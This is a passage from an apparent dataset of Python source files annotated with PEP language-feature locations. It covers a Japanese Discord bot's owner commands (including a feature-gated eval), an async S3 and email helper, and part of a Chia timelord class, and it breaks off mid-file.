def eval(self, ctx, *, cmd):\n        if \"eval\" in self.bot.features.get(ctx.author.id, []):\n            await ctx.message.add_reaction(self.bot.get_emoji(653161518346534912))\n            kg = \"\\n\"\n            txt = f'async def evdf(ctx,bot):{kg}{kg.join([f\" {i}\" for i in cmd.replace(\"```py\",\"\").replace(\"```\",\"\").split(kg)])}'\n            try:\n                exec(txt)\n                await eval(\"evdf(ctx,self.bot)\")\n                await ctx.message.remove_reaction(self.bot.get_emoji(653161518346534912), self.bot.user)\n                await ctx.message.add_reaction(self.bot.get_emoji(653161518103265291))\n            except:\n                await ctx.message.remove_reaction(self.bot.get_emoji(653161518346534912), self.bot.user)\n                await ctx.message.add_reaction(\"\u274c\")\n                await ctx.author.send(embed=discord.Embed(title=\"eval's Error\", description=f\"```{traceback.format_exc(3)}```\", color=self.bot.ec))\n    @commands.command()\n    @commands.is_owner()\n    async def inserver(self, ctx):\n        guilds = self.bot.guilds\n        gcount = len(guilds)-1\n        page = 0\n        embed = discord.Embed(\n            title=\"\u30b5\u30fc\u30d0\u30fc\u60c5\u5831\", description=f\"{guilds[page].name}(id:`{guilds[page].id}`)\", color=self.bot.ec)\n        embed.add_field(name=\"\u30b5\u30fc\u30d0\u30fc\u4eba\u6570\", value=f\"{guilds[page].member_count}\u4eba\")\n        embed.add_field(\n            name=\"\u30d6\u30fc\u30b9\u30c8\u72b6\u614b\", value=f\"{guilds[page].premium_tier}\u30ec\u30d9\u30eb({guilds[page].premium_subscription_count}\u30d6\u30fc\u30b9\u30c8)\")\n        embed.add_field(\n            name=\"\u30c1\u30e3\u30f3\u30cd\u30eb\u72b6\u6cc1\", value=f\"\u30c6\u30ad\u30b9\u30c8:{len(guilds[page].text_channels)}\\n\u30dc\u30a4\u30b9:{len(guilds[page].voice_channels)}\\n\u30ab\u30c6\u30b4\u30ea\u30fc:{len(guilds[page].categories)}\")\n        embed.add_field(\n            name=\"\u30b5\u30fc\u30d0\u30fc\u4f5c\u6210\u65e5\u6642\", value=f\"{(guilds[page].created_at+ rdelta(hours=9)).strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")\n        embed.add_field(\n            name=\"\u601d\u60df\u5948\u3061\u3083\u3093\u5c0e\u5165\u65e5\u6642\", value=f\"{guilds[page].me.joined_at.strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")\n        embed.add_field(name=\"\u30aa\u30fc\u30ca\u30fc\", value=f\"{guilds[page].owner}\")\n        embed.set_thumbnail(url=guilds[page].icon_url_as(static_format=\"png\"))\n        embed.set_footer(text=f\"{page+1}/{gcount+1}\")\n        msg = await ctx.send(embed=embed)\n        await msg.add_reaction(self.bot.get_emoji(653161518195671041))\n        await msg.add_reaction(self.bot.get_emoji(653161518170505216))\n        while True:\n            try:\n                r, u = await self.bot.wait_for(\"reaction_add\", check=lambda r, u: r.message.id == msg.id and u.id == ctx.message.author.id, timeout=30)\n            except:\n                break\n            try:\n                await msg.remove_reaction(r, u)\n            except:\n                pass\n            if str(r) == str(self.bot.get_emoji(653161518170505216)):\n                if page == gcount:\n                    page = 0\n                else:\n                    page = page + 1\n            elif str(r) == str(self.bot.get_emoji(653161518195671041)):\n                if page == 0:\n                    page = gcount\n                else:\n                    page = page - 1\n            embed = discord.Embed(\n                title=\"\u30b5\u30fc\u30d0\u30fc\u60c5\u5831\", description=f\"{guilds[page].name}(id:`{guilds[page].id}`)\", color=self.bot.ec)\n            embed.add_field(\n                name=\"\u30b5\u30fc\u30d0\u30fc\u4eba\u6570\", value=f\"{guilds[page].member_count}\u4eba\")\n            embed.add_field(\n                name=\"\u30d6\u30fc\u30b9\u30c8\u72b6\u614b\", value=f\"{guilds[page].premium_tier}\u30ec\u30d9\u30eb({guilds[page].premium_subscription_count}\u30d6\u30fc\u30b9\u30c8)\")\n            embed.add_field(\n                name=\"\u30c1\u30e3\u30f3\u30cd\u30eb\u72b6\u6cc1\", value=f\"\u30c6\u30ad\u30b9\u30c8:{len(guilds[page].text_channels)}\\n\u30dc\u30a4\u30b9:{len(guilds[page].voice_channels)}\\n\u30ab\u30c6\u30b4\u30ea\u30fc:{len(guilds[page].categories)}\")\n            embed.add_field(\n                name=\"\u30b5\u30fc\u30d0\u30fc\u4f5c\u6210\u65e5\u6642\", value=f\"{(guilds[page].created_at+ rdelta(hours=9)).strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")\n            embed.add_field(\n                name=\"\u601d\u60df\u5948\u3061\u3083\u3093\u5c0e\u5165\u65e5\u6642\", value=f\"{guilds[page].me.joined_at.strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")\n            embed.add_field(name=\"\u30aa\u30fc\u30ca\u30fc\", value=f\"{guilds[page].owner}\")\n            embed.set_thumbnail(\n                url=guilds[page].icon_url_as(static_format=\"png\"))\n            embed.set_footer(text=f\"{page+1}/{gcount+1}\")\n            await msg.edit(embed=embed)\n    @commands.command()\n    @commands.is_owner()\n    async def dmember(self, ctx, *, mus=None):\n        info = None\n        tmp2 = None\n        if mus is None:\n            await ctx.send(\"\u30e1\u30f3\u30d0\u30fcid/\u540d\u524d\u306e\u6307\u5b9a\u306f\u5fc5\u9808\u3067\u3059\u3002\")\n        else:\n            tmp = None\n            try:\n                tmp = int(mus)\n            except:\n                pass\n            for guild in self.bot.guilds:\n                if tmp:\n                    tmp2 = guild.get_member(int(mus))\n                else:\n                    tmp2 = guild.get_member_named(mus)\n                if tmp2:\n                    info = tmp2\n                    break\n        if info:\n            async with ctx.message.channel.typing():\n                if ctx.guild.owner == info:\n                    embed = discord.Embed(title=ctx._(\n                        \"userinfo-name\"), description=f\"{info.name} - {ut.ondevicon(info)} - {ctx._('userinfo-owner')}\", color=info.color)\n                else:\n                    embed = discord.Embed(title=ctx._(\n                        \"userinfo-name\"), description=f\"{info.name} - {ut.ondevicon(info)}\", color=info.color)\n                embed.add_field(name=ctx._(\n                    \"userinfo-joindiscord\"), value=info.created_at)\n                embed.add_field(name=ctx._(\"userinfo-id\"), value=info.id)\n                embed.add_field(name=ctx._(\"userinfo-online\"),\n                                value=f\"{str(info.status)}\")\n                embed.add_field(name=ctx._(\"userinfo-isbot\"),\n                                value=str(info.bot))\n                embed.add_field(name=ctx._(\n                    \"userinfo-displayname\"), value=info.display_name)\n                embed.add_field(name=ctx._(\n                    \"userinfo-joinserver\"), value=info.joined_at)\n                embed.set_footer(\n                    text=f\"\u30b5\u30fc\u30d0\u30fc:{info.guild.name}({info.guild.id})\")\n                if info.activity is not None:\n                    try:\n                        embed.add_field(name=ctx._(\n                            \"userinfo-nowplaying\"), value=f'{info.activity.name}')\n                    except:\n                        embed.add_field(name=ctx._(\n                            \"userinfo-nowplaying\"), value=info.activity)\n                hasroles = \"\"\n                for r in info.roles:\n                    hasroles = hasroles + f\"{r.mention},\"\n                embed.add_field(name=ctx._(\"userinfo-roles\"), value=hasroles)\n                if info.avatar_url is not None:\n                    embed.set_thumbnail(\n                        url=info.avatar_url_as(static_format='png'))\n                    embed.add_field(name=ctx._(\"userinfo-iconurl\"),\n                                    value=info.avatar_url_as(static_format='png'))\n                else:\n                    embed.set_image(\n                        url=info.default_avatar_url_as(static_format='png'))\n            await ctx.send(embed=embed)\n        else:\n            await ctx.send(\"\u4e00\u81f4\u3059\u308b\u30e6\u30fc\u30b6\u30fc\u304c\u3001\u5171\u901a\u30b5\u30fc\u30d0\u30fc\u306b\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f\u3002\")\n    @commands.command()\n    async def cuglobal(self, ctx, *cids):\n        self.bot.cursor.execute(\n            \"select * from users where id=?\", (ctx.author.id,))\n        upf = self.bot.cursor.fetchone()\n        if upf[\"gmod\"] is True:\n            self.bot.cursor.execute(\"select * from globalchs\")\n            chs = self.bot.cursor.fetchall()\n            async with ctx.channel.typing():\n                for cid in [int(i) for i in cids]:\n                    await asyncio.sleep(0.5)\n                    try:\n                        for ch in chs:\n                            if cid in ch[\"ids\"]:\n                                clt = ch[\"ids\"]\n                                clt.remove(cid)\n                                self.bot.cursor.execute(\n                                    \"UPDATE globalchs SET ids = ? WHERE name = ?\", (clt, ch[\"name\"]))\n                                break\n                    except:\n                        pass\n            await ctx.send(\"\u5f37\u5236\u5207\u65ad\u3067\u304d\u3066\u308b\u304b\u78ba\u8a8d\u3057\u3066\u306d\u30fc\")\n    @commands.command()\n    @commands.is_owner()\n    async def retfmt(self, ctx):\n        print(f'{ctx.message.author.name}({ctx.message.guild.name})_' +\n              ctx.message.content)\n        try:\n            await ctx.send(ctx.message.clean_content.replace(\"s-retfmt \", \"\").format(ctx, self.bot).replace(\"\u7b2c\u4e09\u30fb\u5341\u52dd\u30c1\u30e3\u30c3\u30c8 Japan(beta)\", \"\"))\n        except Exception as e:\n            await ctx.send(e)\n    @commands.command()\n    @commands.is_owner()\n    async def changenick(self, ctx, name=None):\n        print(f'{ctx.message.author.name}({ctx.message.guild.name})_' +\n              ctx.message.content)\n        await ctx.message.guild.me.edit(nick=name)\n        if name is None:\n            await ctx.send(\"\u79c1\u306e\u30cb\u30c3\u30af\u30cd\u30fc\u30e0\u3092\u30c7\u30d5\u30a9\u30eb\u30c8\u306e\u540d\u524d\u306b\u5909\u66f4\u3057\u305f\u3088\u3002\")\n        else:\n            await ctx.send(\"\u79c1\u306e\u30cb\u30c3\u30af\u30cd\u30fc\u30e0\u3092\"+name+\"\u306b\u5909\u66f4\u3057\u305f\u3088\u3002\")\n    @commands.command()\n    @commands.is_owner()\n    async def guserft(self, ctx, *, nandt):\n        lt = [f\"{str(m)}({m.id})\" for m in self.bot.users if nandt in str(m)]\n        if lt:\n            t = \"\\n\".join(lt)\n            await ctx.send(embed=ut.getEmbed(f\"{str(nandt)}\u306b\u4e00\u81f4\u3059\u308b\u30e6\u30fc\u30b6\u30fc\", f\"```{t}```\"))\n        else:\n            await ctx.send(embed=ut.getEmbed(\"\", \"\u4e00\u81f4\u30e6\u30fc\u30b6\u30fc\u306a\u3057\"))\n    @commands.command()\n    @commands.is_owner()\n    async def guildv(self, ctx, gid: int, bl: bool=True):\n        print(f'{ctx.message.author.name}({ctx.message.guild.name})_' +\n              ctx.message.content)\n        self.bot.cursor.execute(\n            \"UPDATE guilds SET verified = ? WHERE id = ?\", (bl, gid))\n        await ctx.send(f\"\u30b5\u30fc\u30d0\u30fc`{self.bot.get_guild(gid)}`\u306e\u8a8d\u8a3c\u72b6\u614b\u3092{str(bl)}\u306b\u3057\u307e\u3057\u305f\u3002\")\ndef setup(bot):\n    bot.add_cog(owner(bot))",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        20,
                        22,
                        "async for",
                        "async for m in ch.history(limit=count):\n            await ctx.author.send(embed=ut.getEmbed(\"\u30e1\u30c3\u30bb\u30fc\u30b8\", m.clean_content, self.bot.ec, \"\u9001\u4fe1\u8005\", str(m.author)))\n            await asyncio.sleep(2)"
                    ]
                ],
                "pep_498": [
                    [
                        13,
                        "        text = [f\"{str(ch)} ({ch.id})\" for ch in ctx.guild.channels if cnm in str(ch)]"
                    ],
                    [
                        50,
                        "            txt = f'async def evdf(ctx,bot):{kg}{kg.join([f\" {i}\" for i in cmd.replace(\"```py\",\"\").replace(\"```\",\"\").split(kg)])}'"
                    ],
                    [
                        227,
                        "        lt = [f\"{str(m)}({m.id})\" for m in self.bot.users if nandt in str(m)]"
                    ],
                    [
                        67,
                        "            title=\"\u30b5\u30fc\u30d0\u30fc\u60c5\u5831\", description=f\"{guilds[page].name}(id:`{guilds[page].id}`)\", color=self.bot.ec)"
                    ],
                    [
                        68,
                        "        embed.add_field(name=\"\u30b5\u30fc\u30d0\u30fc\u4eba\u6570\", value=f\"{guilds[page].member_count}\u4eba\")"
                    ],
                    [
                        70,
                        "            name=\"\u30d6\u30fc\u30b9\u30c8\u72b6\u614b\", value=f\"{guilds[page].premium_tier}\u30ec\u30d9\u30eb({guilds[page].premium_subscription_count}\u30d6\u30fc\u30b9\u30c8)\")"
                    ],
                    [
                        72,
                        "            name=\"\u30c1\u30e3\u30f3\u30cd\u30eb\u72b6\u6cc1\", value=f\"\u30c6\u30ad\u30b9\u30c8:{len(guilds[page].text_channels)}\\n\u30dc\u30a4\u30b9:{len(guilds[page].voice_channels)}\\n\u30ab\u30c6\u30b4\u30ea\u30fc:{len(guilds[page].categories)}\")"
                    ],
                    [
                        74,
                        "            name=\"\u30b5\u30fc\u30d0\u30fc\u4f5c\u6210\u65e5\u6642\", value=f\"{(guilds[page].created_at+ rdelta(hours=9)).strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")"
                    ],
                    [
                        76,
                        "            name=\"\u601d\u60df\u5948\u3061\u3083\u3093\u5c0e\u5165\u65e5\u6642\", value=f\"{guilds[page].me.joined_at.strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")"
                    ],
                    [
                        77,
                        "        embed.add_field(name=\"\u30aa\u30fc\u30ca\u30fc\", value=f\"{guilds[page].owner}\")"
                    ],
                    [
                        79,
                        "        embed.set_footer(text=f\"{page+1}/{gcount+1}\")"
                    ],
                    [
                        208,
                        "        print(f'{ctx.message.author.name}({ctx.message.guild.name})_' +"
                    ],
                    [
                        217,
                        "        print(f'{ctx.message.author.name}({ctx.message.guild.name})_' +"
                    ],
                    [
                        236,
                        "        print(f'{ctx.message.author.name}({ctx.message.guild.name})_' +"
                    ],
                    [
                        240,
                        "        await ctx.send(f\"\u30b5\u30fc\u30d0\u30fc`{self.bot.get_guild(gid)}`\u306e\u8a8d\u8a3c\u72b6\u614b\u3092{str(bl)}\u306b\u3057\u307e\u3057\u305f\u3002\")"
                    ],
                    [
                        103,
                        "                title=\"\u30b5\u30fc\u30d0\u30fc\u60c5\u5831\", description=f\"{guilds[page].name}(id:`{guilds[page].id}`)\", color=self.bot.ec)"
                    ],
                    [
                        105,
                        "                name=\"\u30b5\u30fc\u30d0\u30fc\u4eba\u6570\", value=f\"{guilds[page].member_count}\u4eba\")"
                    ],
                    [
                        107,
                        "                name=\"\u30d6\u30fc\u30b9\u30c8\u72b6\u614b\", value=f\"{guilds[page].premium_tier}\u30ec\u30d9\u30eb({guilds[page].premium_subscription_count}\u30d6\u30fc\u30b9\u30c8)\")"
                    ],
                    [
                        109,
                        "                name=\"\u30c1\u30e3\u30f3\u30cd\u30eb\u72b6\u6cc1\", value=f\"\u30c6\u30ad\u30b9\u30c8:{len(guilds[page].text_channels)}\\n\u30dc\u30a4\u30b9:{len(guilds[page].voice_channels)}\\n\u30ab\u30c6\u30b4\u30ea\u30fc:{len(guilds[page].categories)}\")"
                    ],
                    [
                        111,
                        "                name=\"\u30b5\u30fc\u30d0\u30fc\u4f5c\u6210\u65e5\u6642\", value=f\"{(guilds[page].created_at+ rdelta(hours=9)).strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")"
                    ],
                    [
                        113,
                        "                name=\"\u601d\u60df\u5948\u3061\u3083\u3093\u5c0e\u5165\u65e5\u6642\", value=f\"{guilds[page].me.joined_at.strftime('%Y{0}%m{1}%d{2} %H{3}%M{4}%S{5}').format(*'\u5e74\u6708\u65e5\u6642\u5206\u79d2')}\")"
                    ],
                    [
                        114,
                        "            embed.add_field(name=\"\u30aa\u30fc\u30ca\u30fc\", value=f\"{guilds[page].owner}\")"
                    ],
                    [
                        117,
                        "            embed.set_footer(text=f\"{page+1}/{gcount+1}\")"
                    ],
                    [
                        15,
                        "        await ctx.send(embed=ut.getEmbed(\"\u4e00\u81f4\u30c1\u30e3\u30f3\u30cd\u30eb\", f\"```{t}```\"))"
                    ],
                    [
                        152,
                        "                                value=f\"{str(info.status)}\")"
                    ],
                    [
                        160,
                        "                    text=f\"\u30b5\u30fc\u30d0\u30fc:{info.guild.name}({info.guild.id})\")"
                    ],
                    [
                        170,
                        "                    hasroles = hasroles + f\"{r.mention},\""
                    ],
                    [
                        50,
                        "            txt = f'async def evdf(ctx,bot):{kg}{kg.join([f\" {i}\" for i in cmd.replace(\"```py\",\"\").replace(\"```\",\"\").split(kg)])}'"
                    ],
                    [
                        144,
                        "                        \"userinfo-name\"), description=f\"{info.name} - {ut.ondevicon(info)} - {ctx._('userinfo-owner')}\", color=info.color)"
                    ],
                    [
                        147,
                        "                        \"userinfo-name\"), description=f\"{info.name} - {ut.ondevicon(info)}\", color=info.color)"
                    ],
                    [
                        230,
                        "            await ctx.send(embed=ut.getEmbed(f\"{str(nandt)}\u306b\u4e00\u81f4\u3059\u308b\u30e6\u30fc\u30b6\u30fc\", f\"```{t}```\"))"
                    ],
                    [
                        230,
                        "            await ctx.send(embed=ut.getEmbed(f\"{str(nandt)}\u306b\u4e00\u81f4\u3059\u308b\u30e6\u30fc\u30b6\u30fc\", f\"```{t}```\"))"
                    ],
                    [
                        164,
                        "                            \"userinfo-nowplaying\"), value=f'{info.activity.name}')"
                    ],
                    [
                        59,
                        "                await ctx.author.send(embed=discord.Embed(title=\"eval's Error\", description=f\"```{traceback.format_exc(3)}```\", color=self.bot.ec))"
                    ]
                ]
            }
        },
        "169": {
            "file": "import json\nimport logging\nimport os\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom urllib import parse as urlparse\nimport aiobotocore\nimport tldextract\nfrom botocore.exceptions import ClientError\nlogger = logging.getLogger(__name__)\ndef send_email(\n    sender,\n    pwd,\n    recipients,\n    subject=\"Email from Python\",\n    body=\"\",\n    smtp=\"smtp.gmail.com:465\",\n):\n    recipients = recipients if isinstance(recipients, list) else [recipients]\n    body = open(body, \"rb\").read() if os.path.isfile(body) else body\n    msg = MIMEText(body)\n    msg[\"Subject\"] = subject\n    msg[\"From\"] = \"DdL <{}>\".format(sender)\n    msg[\"To\"] = \", \".join(recipients)\n    smtp_obj = smtplib.SMTP_SSL(smtp)\n    smtp_obj.ehlo()\n    smtp_obj.login(sender, pwd)\n    failures = smtp_obj.sendmail(sender, recipients, msg.as_string())\n    smtp_obj.close()\n    return failures\ndef extract_domain(url):\n    if not isinstance(url, str):\n        return\n    if \"://\" in url and not url.lstrip().startswith(\"http\"):\n        return\n    result = tldextract.extract(url)\n    fqdn = result.fqdn.lower().lstrip(\".\\\\\")\n    extracted = fqdn[4:] if result.subdomain and fqdn.startswith(\"www.\") else fqdn\n    if extracted and len(extracted) <= 2000:\n        return extracted\ndef merge_url_query(url, _doseq=True, **kwargs):\n    from urllib.parse import urlparse, urlencode, parse_qs, unquote\n    parsed = urlparse(unquote(url))\n    return parsed._replace(\n        query=urlencode({**parse_qs(parsed.query), **kwargs}, doseq=_doseq)\n    ).geturl()\nclass S3io:\n    def __init__(\n        self,\n        aiobotocore_client=None,\n        aws_access_key_id=None,\n        aws_secret_access_key=None,\n        region_name=\"eu-central-1\",\n        **kwargs,\n    ):\n        self.loop = asyncio.get_event_loop()\n        if aiobotocore_client is not None:\n            self.s3 = aiobotocore_client\n        else:\n            client_config = {\"service_name\": \"s3\", \"region_name\": region_name}\n            aws_access_key_id = aws_access_key_id or os.environ.get(\n                \"AWS_ACCESS_KEY_ID\"\n            )  \n            aws_secret_access_key = aws_secret_access_key or os.environ.get(\n                \"AWS_SECRET_ACCESS_KEY\"\n            )  \n            if aws_access_key_id is not None:\n                client_config.update({\"aws_access_key_id\": aws_access_key_id})\n            if aws_secret_access_key is not None:\n                client_config.update(\n                    {\"aws_secret_access_key\": aws_secret_access_key}\n                )  \n            self.s3 = aiobotocore.get_session(loop=self.loop).create_client(\n                **client_config\n            )\n    async def __aenter__(self):\n        return self\n    async def __aexit__(self, *exc_info):\n        try:\n            await self.s3.close()\n        except AttributeError:\n            pass\n    @staticmethod\n    def _parse_s3_path(s3_path):\n        if not s3_path.startswith(\"s3://\"):\n            s3_path = \"s3://\" + s3_path.strip(\"/\")\n        parsed = urlparse.urlparse(s3_path)\n        return parsed.netloc, parsed.path[1:]\n    async def object_exists(self, s3_path):\n        bucket, key = self._parse_s3_path(s3_path)\n        try:\n            await self.s3.head_object(Bucket=bucket, Key=key)\n        except ClientError as e:\n            if e.response[\"ResponseMetadata\"][\"HTTPStatusCode\"] == 404:\n                return False\n            else:\n                raise\n        else:\n            return True\n    async def read_bytes(self, s3_path):\n        bucket, key = self._parse_s3_path(s3_path)\n        response = await self.s3.get_object(Bucket=bucket, Key=key)\n        async with response[\"Body\"] as stream:\n            return await stream.read()\n    async def read_text(self, s3_path, encoding=\"utf-8\"):\n        body = await self.read_bytes(s3_path)\n        return body.decode(encoding)\n    async def read_json(self, s3_path):\n        body = await self.read_text(s3_path, \"utf-8\")\n        return json.loads(body)\n    async def write_object(self, body, s3_path, encoding=\"utf-8\"):\n        bucket, key = self._parse_s3_path(s3_path)\n        if not isinstance(body, (bytes, str)):\n            body = json.dumps(body, indent=2)\n        if isinstance(body, str):\n            body = body.encode(encoding)\n        await self.s3.put_object(Bucket=bucket, Key=key, Body=body)\n    async def delete_object(self, s3_path):\n        bucket, key = self._parse_s3_path(s3_path)\n        await self.s3.delete_object(Bucket=bucket, Key=key)\n    async def copy_object(self, s3_path_old, s3_path_new):\n        bucket, key = self._parse_s3_path(s3_path_new)\n        source = os.path.join(*self._parse_s3_path(s3_path_old))\n        try:\n            await self.s3.copy_object(Bucket=bucket, Key=key, CopySource=source)\n        except ClientError as e:\n            if e.response[\"Error\"][\"Code\"] == \"NoSuchKey\":\n                raise FileNotFoundError(s3_path_old)\n            else:\n                raise\n    async def move_object(self, s3_path_old, s3_path_new):\n        await self.copy_object(s3_path_old, s3_path_new)\n        await self.delete_object(s3_path_old)\n    async def list_objects(self, bucket, prefix=None, recursive=True):\n        paginator = self.s3.get_paginator(\"list_objects_v2\")\n        config = {\"Bucket\": bucket}\n        if prefix:\n            config.update({\"Prefix\": prefix})\n        if not recursive:\n            config.update({\"Delimiter\": \"/\"})\n        objects = []\n        async for result in paginator.paginate(**config):\n            for _object in result.get(\"Contents\", []):\n                objects.append(_object)\n        return objects\n    async def list_keys(\n        self,\n        bucket,\n        prefix=None,\n        suffix=None,\n        recursive=True,\n        date_sort=True,\n        reverse=False,\n    ):\n        objects = await self.list_objects(bucket, prefix, recursive)\n        if date_sort:\n            objects = sorted(\n                objects,\n                key=lambda obj: int(obj[\"LastModified\"].strftime(\"%s\")),\n                reverse=reverse,\n            )\n        return [o[\"Key\"] for o in objects if not suffix or o[\"Key\"].endswith(suffix)]\n    async def list_folders(\n        self, bucket, prefix=None, recursive=True, date_sort=True, reverse=False\n    ):\n        prefix = prefix.lstrip(\"/\")\n        keys = await self.list_keys(\n            bucket=bucket,\n            prefix=prefix,\n            suffix=None,\n            recursive=True,\n            date_sort=date_sort,\n            reverse=True,\n        )\n        prefix_is_folder = keys[0].replace(prefix, \"\", 1).startswith(\"/\")\n        if prefix_is_folder:\n            prefix += \"/\"\n        folders = []\n        for key in keys:\n            components = key.replace(prefix, \"\", 1).split(\"/\")[:-1]\n            if components:\n                components = components if recursive else [components[0]]\n                subfolder = prefix + \"/\".join(components)\n                folders.append(subfolder) if subfolder not in folders else None\n        return folders if reverse else folders[::-1]\nasync def main():\n    async with S3io() as s3:\n        logger.info(await s3.list_folders(\"test-bucket\", \"test/sub/folder/\"))\nif __name__ == \"__main__\":\n    import asyncio\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())\n    loop.close()",
            "patterns": {
                "pep_468": [
                    [
                        73,
                        "aiobotocore.get_session(loop=self.loop).create_client(\n                **client_config\n            )"
                    ],
                    [
                        142,
                        "paginator.paginate(**config)"
                    ]
                ],
                "pep_567": [
                    [
                        190,
                        190,
                        "import",
                        "    import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        142,
                        144,
                        "async for",
                        "async for result in paginator.paginate(**config):\n            for _object in result.get(\"Contents\", []):\n                objects.append(_object)"
                    ]
                ],
                "pep_498v": [
                    [
                        23,
                        23,
                        ".format()"
                    ]
                ]
            }
        },
        "170": {
            "file": "import asyncio\nimport io\nimport logging\nimport time\nfrom asyncio import Lock, StreamReader, StreamWriter\nfrom typing import Dict, List, Optional, Tuple\nfrom lib.chiavdf.inkfish.classgroup import ClassGroup\nfrom lib.chiavdf.inkfish.create_discriminant import create_discriminant\nfrom lib.chiavdf.inkfish.proof_of_time import check_proof_of_time_nwesolowski\nfrom src.consensus.constants import constants\nfrom src.protocols import timelord_protocol\nfrom src.server.outbound_message import Delivery, Message, NodeType, OutboundMessage\nfrom src.types.classgroup import ClassgroupElement\nfrom src.types.proof_of_time import ProofOfTime\nfrom src.types.sized_bytes import bytes32\nfrom src.util.api_decorators import api_request\nfrom src.util.ints import uint8, uint64\nlog = logging.getLogger(__name__)\nclass Timelord:\n    def __init__(self, config: Dict):\n        self.config: Dict = config\n        self.ips_estimate = {\n            k: v\n            for k, v in list(\n                zip(\n                    self.config[\"vdf_clients\"][\"ip\"],\n                    self.config[\"vdf_clients\"][\"ips_estimate\"],\n                )\n            )\n        }\n        self.lock: Lock = Lock()\n        self.active_discriminants: Dict[bytes32, Tuple[StreamWriter, uint64, str]] = {}\n        self.best_weight_three_proofs: int = -1\n        self.active_discriminants_start_time: Dict = {}\n        self.pending_iters: Dict = {}\n        self.submitted_iters: Dict = {}\n        self.done_discriminants: List[bytes32] = []\n        self.proofs_to_write: List[OutboundMessage] = []\n        self.seen_discriminants: List[bytes32] = []\n        self.proof_count: Dict = {}\n        self.avg_ips: Dict = {}\n        self.discriminant_queue: List[Tuple[bytes32, uint64]] = []\n        self.max_connection_time = self.config[\"max_connection_time\"]\n        self.potential_free_clients: List = []\n        self.free_clients: List[Tuple[str, StreamReader, StreamWriter]] = []\n        self._is_shutdown = False\n    async def _handle_client(self, reader: StreamReader, writer: StreamWriter):\n        async with self.lock:\n            client_ip = writer.get_extra_info('peername')[0]\n            log.info(f\"New timelord connection from client: {client_ip}.\")\n            if client_ip in self.ips_estimate.keys():\n                self.free_clients.append((client_ip, reader, writer))\n                log.info(f\"Added new VDF client {client_ip}.\")\n                for ip, end_time in list(self.potential_free_clients):\n                    if ip == client_ip:\n                        self.potential_free_clients.remove((ip, end_time))\n                        break\n    async def _shutdown(self):\n        async with self.lock:\n            for (\n                stop_discriminant,\n                (stop_writer, _, _),\n            ) in self.active_discriminants.items():\n                stop_writer.write(b\"010\")\n                await stop_writer.drain()\n                self.done_discriminants.append(stop_discriminant)\n            self.active_discriminants.clear()\n            self.active_discriminants_start_time.clear()\n        self._is_shutdown = True\n    async def _stop_worst_process(self, worst_weight_active):\n        log.info(f\"Stopping one process at weight {worst_weight_active}\")\n        stop_writer: Optional[StreamWriter] = None\n        stop_discriminant: Optional[bytes32] = None\n        low_weights = {\n            k: v\n            for k, v in self.active_discriminants.items()\n            if v[1] == worst_weight_active\n        }\n        no_iters = {\n            k: v\n            for k, v in low_weights.items()\n            if k not in self.pending_iters or len(self.pending_iters[k]) == 0\n        }\n        if len(no_iters) > 0:\n            latest_start_time = max(\n                [self.active_discriminants_start_time[k] for k, _ in no_iters.items()]\n            )\n            stop_discriminant, stop_writer = next(\n                (k, v[0])\n                for k, v in no_iters.items()\n                if self.active_discriminants_start_time[k] == latest_start_time\n            )\n        else:\n            best_iter = {k: min(self.pending_iters[k]) for k, _ in low_weights.items()}\n            time_taken = {\n                k: time.time() - self.active_discriminants_start_time[k]\n                for k, _ in low_weights.items()\n            }\n            client_ip = [v[2] for _, v in low_weights.items()]\n            ips = {}\n            for ip in client_ip:\n                if ip in self.avg_ips:\n                    current_ips, _ = self.avg_ips[ip]\n                    ips[ip] = current_ips\n                else:\n                    ips[ip] = self.ips_estimate[ip]\n            expected_finish = {\n                k: max(0, (best_iter[k] - time_taken[k] * ips[v[2]]) / ips[v[2]])\n                for k, v in low_weights.items()\n            }\n            worst_finish = max([v for v in expected_finish.values()])\n            log.info(f\"Worst finish time: {worst_finish}s\")\n            stop_discriminant, stop_writer = next(\n                (k, v[0])\n                for k, v in low_weights.items()\n                if expected_finish[k] == worst_finish\n            )\n        assert stop_writer is not None\n        _, _, stop_ip = self.active_discriminants[stop_discriminant]\n        self.potential_free_clients.append((stop_ip, time.time()))\n        stop_writer.write(b\"010\")\n        await stop_writer.drain()\n        del self.active_discriminants[stop_discriminant]\n        del self.active_discriminants_start_time[stop_discriminant]\n        self.done_discriminants.append(stop_discriminant)\n    async def _update_avg_ips(self, challenge_hash, iterations_needed, ip):\n        async with self.lock:\n            if challenge_hash in self.active_discriminants:\n                time_taken = (\n                    time.time() - self.active_discriminants_start_time[challenge_hash]\n                )\n                ips = int(iterations_needed / time_taken * 10) / 10\n                log.info(\n                    f\"Finished PoT, chall:{challenge_hash[:10].hex()}..\"\n                    f\" {iterations_needed} iters. {int(time_taken*1000)/1000}s, {ips} ips\"\n                )\n                if ip not in self.avg_ips:\n                    self.avg_ips[ip] = (ips, 1)\n                else:\n                    prev_avg_ips, trials = self.avg_ips[ip]\n                    new_avg_ips = int((prev_avg_ips * trials + ips) / (trials + 1))\n                    self.avg_ips[ip] = (new_avg_ips, trials + 1)\n                    log.info(f\"New estimate: {new_avg_ips}\")\n                self.pending_iters[challenge_hash].remove(iterations_needed)\n            else:\n                log.info(\n                    f\"Finished PoT chall:{challenge_hash[:10].hex()}.. {iterations_needed}\"\n                    f\" iters. But challenge not active 